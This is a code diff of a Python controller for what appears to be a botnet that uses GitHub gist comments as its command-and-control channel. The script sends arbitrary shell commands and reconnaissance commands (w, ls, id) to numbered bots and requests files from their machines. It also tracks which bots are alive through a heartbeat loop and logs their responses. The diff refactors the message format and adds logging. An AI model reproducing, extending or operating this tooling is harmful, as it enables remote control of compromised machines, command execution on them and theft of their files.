@@ -2,21 +2,29 @@ import argparse
 import time
 import utils
 from utils import Command
+import log
 
-REFRESH_DELAY = 360  # 6 minutes
+SHOW_INFO = True
+LOGFILE = '.controllog'
 
 LAST_COMMENT = 0
 
 
 # TODO: better message
-def error():
+def error(args):
     print("Bad input")
+    print(args)
 
 
 def heartbeat():
+    global LAST_COMMENT
+    LAST_COMMENT = utils.get_last_comment_id()
+    log.add_log_entry(SHOW_INFO, LOGFILE, log.InitEntry(LAST_COMMENT))
+
     while True:
         send_heartbeat()
-        time.sleep(REFRESH_DELAY)
+        if SHOW_INFO: print("SLEEP\n")
+        time.sleep(utils.REFRESH_DELAY)
         check_bots()
 
 
@@ -30,35 +38,35 @@ def check_bots():
 
     alive = set()
     for comment in data:
-        bot, d = parse_response(comment['body'])
+        isctrl, bot, cmd, d, r = utils.parse_msg(comment['body'])
+        if isctrl: continue
         alive.add(bot)
-        show_response(bot, d)
+        handle_response(bot, cmd, d)
     
-    print(" >>> ALIVE: " + str(len(alive)) + '\n')
+    log.add_log_entry(SHOW_INFO, LOGFILE, log.AliveBots(alive))
     return alive
 
 
-# TODO rework
-# TODO: check if parsable
-def parse_response(comment):
-    s = comment.find('\n')
-    bot = int(comment[:s])
-    data = comment[s+1:]
-    return bot, data
-
-
-def show_response(bot, data):
-    print(str(bot) + ':\n' + data + '\n')
+def handle_response(bot, cmd, data):
+    if cmd != Command.HEARTBEAT:
+        log.add_log_entry(SHOW_INFO, LOGFILE, log.Response(bot, cmd, data))
 
 
 def send_command(bot, cmd, data, respond):
-    comment = parse_command(bot, cmd, data, respond)
-    return utils.post_gist_comment(comment)
+    comment = construct_command(bot, cmd, data, respond)
+    response = utils.post_gist_comment(comment)
+    log.add_log_entry(SHOW_INFO, LOGFILE, log.Command(bot, cmd, data, respond))
+    return response
 
 
 # TODO rework
-def parse_command(bot, cmd, data, respond):
-    return str(bot) + '\n' + cmd.name + '\n' + data + '\n' + str(int(respond)) + '\n'
+def construct_command(bot, cmd, data, respond):
+    return utils.DELIM \
+        + str(int(True)) + utils.DELIM \
+        + str(bot) + utils.DELIM \
+        + cmd.name + utils.DELIM \
+        + data + utils.DELIM \
+        + str(int(respond)) + utils.DELIM
 
 
 def request_file(bot, filepath, respond):
@@ -66,29 +74,27 @@ def request_file(bot, filepath, respond):
     return
 
 
-def handle_input(args):
+def main(args):
     if args.command == 'heartbeat' or args.command == 'hb':
         return heartbeat()
 
-    if args.bot <= 0: return error()
-    respond = not args.silent
+    respond = not args.noresponse
 
     if args.command == 'cmd' or args.command == 'exec':
-        if (args.data == ''): return error()
+        if (args.data == ''): return error(args)
         return send_command(args.bot, Command.CMD, args.data, respond)
 
     elif args.command == 'w':
         return send_command(args.bot, Command.CMD, 'w', respond)
 
     elif args.command == 'ls':
-        if (args.data == ''): return error()
         return send_command(args.bot, Command.CMD, 'ls ' + args.data, respond)
 
     elif args.command == 'id':
         return send_command(args.bot, Command.CMD, 'id', respond)
 
     elif args.command == 'req_file' or args.command == 'rf':
-        if (args.data == ''): return error()
+        if (args.data == ''): return error(args)
         return request_file(args.bot, args.data, respond)
 
 
@@ -105,6 +111,9 @@ if __name__ == "__main__":
     parser.add_argument('-d', '--data', default='')
     parser.add_argument('-b', '--bot', default=0, type=int)
     parser.add_argument('-s', '--silent', action='store_true')
+    parser.add_argument('-n', '--noresponse', action='store_true')
 
     args = parser.parse_args()
-    handle_input(args)
+    if args.silent: SHOW_INFO = False
+
+    main(args)
